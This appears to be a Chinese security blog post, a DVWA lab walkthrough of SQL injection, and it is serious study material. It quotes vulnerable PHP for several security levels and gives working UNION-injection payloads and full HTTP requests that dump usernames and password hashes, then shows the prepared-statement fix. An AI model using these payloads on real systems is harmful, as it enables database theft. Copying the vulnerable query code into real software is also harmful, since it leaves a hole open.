@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="dvwa学习," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="dvwa sql注入sql注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，获取数据库中的信息 测试环境一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口 low级别代码如下 &amp;lt;?php  if( isset( $_REQUEST[ &amp;apos;Subm">
+<meta name="keywords" content="dvwa学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dvwa sql injection">
+<meta property="og:url" content="http://yoursite.com/2017/12/24/sqlinjection/index.html">
+<meta property="og:site_name" content="Lawliet Blog">
+<meta property="og:description" content="dvwa sql注入sql注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，获取数据库中的信息 测试环境一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口 low级别代码如下 &amp;lt;?php  if( isset( $_REQUEST[ &amp;apos;Subm">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/JCjCgldeL2.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/A442C508cJ.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/IE4Gja4F26.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/5f6FD7DHhF.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/1F8G23ac13.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/IcLeEGEDCk.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/FDhCaddbm7.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/F0Emh8aEbe.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/ml7al5C1B1.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/fli2IdGhkf.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/66Fb7gb5E1.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171225/IeeEEKi296.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171225/00dGfLb1Ka.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171225/d1h7HCgAfI.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171225/c2kKHDfi8j.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171225/mDDE0eCcBB.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171225/5fl4g8f61B.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171225/d3cBLg6Djg.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171225/809E8BDDbL.PNG">
+<meta property="og:updated_time" content="2017-12-25T02:15:53.202Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dvwa sql injection">
+<meta name="twitter:description" content="dvwa sql注入sql注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，获取数据库中的信息 测试环境一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口 low级别代码如下 &amp;lt;?php  if( isset( $_REQUEST[ &amp;apos;Subm">
+<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/171224/JCjCgldeL2.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/12/24/sqlinjection/"/>
+
+
+
+
+
+  <title>dvwa sql injection | Lawliet Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lawliet Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">原创文章，未经授权请勿转载</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/24/sqlinjection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/L-Lawliet.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lawliet Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">dvwa sql injection</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-24T21:12:44+08:00">
+                2017-12-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="dvwa-sql注入"><a href="#dvwa-sql注入" class="headerlink" title="dvwa sql注入"></a>dvwa sql注入</h1><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><strong>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，获取数据库中的信息</strong></p>
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口</strong></p>
+<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
+    // Get input
+    $id = $_REQUEST[ &apos;id&apos; ];
+
+    // Check database
+    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Get values
+        $first = $row[&quot;first_name&quot;];
+        $last  = $row[&quot;last_name&quot;];
+
+        // Feedback for end user
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+    }
+
+    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
+}
+
+?&gt;
+</code></pre><p><strong>可见直接将id带入数据库查询，注入点在id上</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#
+</code></pre><p><strong>先来手注一下试试，注入的方法很多，常见的有union注入，报错注入（之前的文章有总结报错注入，有兴趣可以去看），基于布尔的盲注，基于时间的盲注等方法，在这里我们用union注入，首先在id后加单引号，报错，说明可能存在注入</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/JCjCgldeL2.PNG" alt="mark"><br><strong>接下来用<code>order by</code>猜列数，因为union查询要求前后字段数一致，可以看出<code>order by 2</code>页面正常，<code>order by 3</code>页面报错</strong></p>
+<p><strong>payload</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; order by 2%23&amp;Submit=Submit#
+</code></pre><p><strong>页面正常</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/A442C508cJ.PNG" alt="mark"><br><strong>payload</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; order by 3%23&amp;Submit=Submit#
+</code></pre><p><strong>报出<code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code>的错误</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/IE4Gja4F26.PNG" alt="mark"><br><strong>接着输入</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select 1,2%23&amp;Submit=Submit#
+</code></pre><p><strong>作用是为了判断查询结果输出的位置，and 1=2使前面的语句查询为空，只显示union select后的结果，可以看出查询结果的位置在First name:和Surname:后面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/5f6FD7DHhF.PNG" alt="mark"><br><strong>接下来判断当前数据库，用户，数据库版本，语句如下</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select database(),2%23&amp;Submit=Submit#
+</code></pre><p><strong>当前数据库名为dvwa</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/1F8G23ac13.PNG" alt="mark"></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select user(),2%23&amp;Submit=Submit#
+</code></pre><p><strong>用户为root@localhost</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/IcLeEGEDCk.PNG" alt="mark"></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select version(),2%23&amp;Submit=Submit#
+</code></pre><p><strong>版本为5.0.51b-community-nt</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/FDhCaddbm7.PNG" alt="mark"><br><strong>information_schema是mysql5.0版本后出现的虚拟库，接下来使用information_schema数据库查询所有数据库名，语句为</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(schema_name),2 from information_schema.schemata%23&amp;Submit=Submit#
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/F0Emh8aEbe.PNG" alt="mark"><br><strong>接下来查询当前数据库下的所有表，语句为</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()%23&amp;Submit=Submit#
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/ml7al5C1B1.PNG" alt="mark"><br><strong>查询users表下的所有列名，语句为</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;users&apos;%23&amp;Submit=Submit#
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/fli2IdGhkf.PNG" alt="mark"><br><strong>接下来查询users表下user和password中的内容，获取所有dvwa用户的登陆用户名和密码hash值</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(user,0x3a,password),2 from users%23&amp;Submit=Submit#
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/66Fb7gb5E1.PNG" alt="mark"><br><strong>hash值可以在somd5上解密</strong></p>
+<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Submit&apos; ] ) ) {
+    // Get input
+    $id = $_POST[ &apos;id&apos; ];
+
+    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);
+
+    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Display values
+        $first = $row[&quot;first_name&quot;];
+        $last  = $row[&quot;last_name&quot;];
+
+        // Feedback for end user
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+    }
+
+}
+
+// This is used later on in the index.php page
+// Setting it here so we can close the database connection in here like in the rest of the source scripts
+$query  = &quot;SELECT COUNT(*) FROM users;&quot;;
+$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+$number_of_rows = mysqli_fetch_row($result);
+$number_of_rows=$number_of_rows[0];
+mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
+?&gt;
+</code></pre><p><strong>可看出将$_POST[ ‘id’ ]直接带入数据库查询，同时对id参数用<code>mysqli_real_escape_string</code>函数进行了特殊字符转义，官网描述的是</strong></p>
+<pre><code>Characters encoded are NUL (ASCII 0), \n, \r, \, &apos;, &quot;, and Control-Z.
+</code></pre><p><strong>这次将参数id以post方式提交至服务器，注入点为post提交的id参数</strong></p>
+<p><strong>提交请求，抓包，发送至Repeater</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/IeeEEKi296.PNG" alt="mark"><br><strong>注入点在id参数上，注入方法和之前的get参数注入方式一样用union注入</strong></p>
+<p><strong>在参数1后加单引号，报错说明可能存在注入，唯一不同的是我们的单引号被<code>\</code>转义</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/00dGfLb1Ka.PNG" alt="mark"><br><strong>获取当前数据库下所有表名</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/d1h7HCgAfI.PNG" alt="mark"><br><strong>获取users表下所有列名，由于单引号被转移，所以要对users进行16进制编码0x7573657273</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/c2kKHDfi8j.PNG" alt="mark"><br><strong>最终获取所有dvwa所有用户名密码的payload</strong></p>
+<pre><code>POST /DVWA-master/vulnerabilities/sqli/ HTTP/1.1
+Host: 192.168.50.128:8080
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 85
+Referer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/
+Cookie: security=medium; PHPSESSID=391dtb6pnltant1m10u62tag52
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+id=1 and 1=2 union select group_concat(user,0x3a,password),2 from users&amp;Submit=Submit
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/mDDE0eCcBB.PNG" alt="mark"></p>
+<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_SESSION [ &apos;id&apos; ] ) ) {
+    // Get input
+    $id = $_SESSION[ &apos;id&apos; ];
+
+    // Check database
+    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Get values
+        $first = $row[&quot;first_name&quot;];
+        $last  = $row[&quot;last_name&quot;];
+
+        // Feedback for end user
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);        
+}
+
+?&gt;
+</code></pre><p><strong>可以看到将<code>$_SESSION[ &#39;id&#39; ]</code>带入数据库查询，session文件默认存放在服务器web目录的tmp目录下</strong><br><strong>我们看看<code>$_SESSION[ &#39;id&#39; ]</code>从何处来，点击 Click here to change your ID. 处理我们提交参数的是session-input.php，代码如下</strong></p>
+<pre><code>&lt;?php
+
+define( &apos;DVWA_WEB_PAGE_TO_ROOT&apos;, &apos;../../&apos; );
+require_once DVWA_WEB_PAGE_TO_ROOT . &apos;dvwa/includes/dvwaPage.inc.php&apos;;
+
+dvwaPageStartup( array( &apos;authenticated&apos;, &apos;phpids&apos; ) );
+
+$page = dvwaPageNewGrab();
+$page[ &apos;title&apos; ] = &apos;SQL Injection Session Input&apos; . $page[ &apos;title_separator&apos; ].$page[ &apos;title&apos; ];
+
+if( isset( $_POST[ &apos;id&apos; ] ) ) {
+    $_SESSION[ &apos;id&apos; ] =  $_POST[ &apos;id&apos; ];
+    //$page[ &apos;body&apos; ] .= &quot;Session ID set!&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&quot;;
+    $page[ &apos;body&apos; ] .= &quot;Session ID: {$_SESSION[ &apos;id&apos; ]}&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&quot;;
+    $page[ &apos;body&apos; ] .= &quot;&lt;script&gt;window.opener.location.reload(true);&lt;/script&gt;&quot;;
+}
+
+$page[ &apos;body&apos; ] .= &quot;
+&lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;
+&lt;input type=\&quot;text\&quot; size=\&quot;15\&quot; name=\&quot;id\&quot;&gt;
+&lt;input type=\&quot;submit\&quot; name=\&quot;Submit\&quot; value=\&quot;Submit\&quot;&gt;
+&lt;/form&gt;
+&lt;hr /&gt;
+&lt;br /&gt;
+
+&lt;button onclick=\&quot;self.close();\&quot;&gt;Close&lt;/button&gt;&quot;;
+
+dvwaSourceHtmlEcho( $page );
+
+?&gt;
+</code></pre><p><strong>代码将我们的输入的id参数根据PHPSESSID将<code>$_POST[ &#39;id&#39; ]</code>赋值给<code>$_SESSION[ &#39;id&#39; ]</code>存放在tmp目录下的对应的session文件中，并且刷新页面带上PHPSESSID，然后high.php根据PHPSESSID将对应tmp下的session文件中的<code>$_SESSION[ &#39;id&#39; ]</code>带入数据库查询</strong></p>
+<p><strong>所以可看出注入点实际上还是在我们提交的<code>$_POST[ &#39;id&#39; ]</code>中</strong><br><strong>最终我们抓包修改id参数获取dvwa所有用户名密码payload</strong></p>
+<pre><code>POST /DVWA-master/vulnerabilities/sqli/session-input.php HTTP/1.1
+Host: 192.168.50.128:8080
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+Referer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/session-input.php
+Cookie: security=high; PHPSESSID=391dtb6pnltant1m10u62tag52
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+id=1&apos; and 1=2 union select group_concat(user,0x3a,password),2 from users#&amp;Submit=Submit
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/5fl4g8f61B.png?imageslim" alt="mark"><br><strong>可以看出我们的payload已经写入到了服务器的session文件<code>sess_391dtb6pnltant1m10u62tag52</code>中</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/d3cBLg6Djg.PNG" alt="mark"><br><strong>然后将我们session文件中的payload带入数据库查询，获取所有用户名和密码hash值</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/809E8BDDbL.PNG" alt="mark"></p>
+<h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_GET[ &apos;Submit&apos; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
+
+    // Get input
+    $id = $_GET[ &apos;id&apos; ];
+
+    // Was a number entered?
+    if(is_numeric( $id )) {
+        // Check the database
+        $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );
+        $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );
+        $data-&gt;execute();
+        $row = $data-&gt;fetch();
+
+        // Make sure only 1 result is returned
+        if( $data-&gt;rowCount() == 1 ) {
+            // Get values
+            $first = $row[ &apos;first_name&apos; ];
+            $last  = $row[ &apos;last_name&apos; ];
+
+            // Feedback for end user
+            echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre><p><strong>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</strong></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/dvwa学习/" rel="tag"># dvwa学习</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/22/DVWA CSRF/" rel="next" title="dvwa CSRF">
+                <i class="fa fa-chevron-left"></i> dvwa CSRF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/25/DVWAFileUpload/" rel="prev" title="dvwa File Upload">
+                dvwa File Upload <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/L-Lawliet.jpg"
+                alt="Lawliet" />
+            
+              <p class="site-author-name" itemprop="name">Lawliet</p>
+              <p class="site-description motion-element" itemprop="description">信息安全技术博客</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
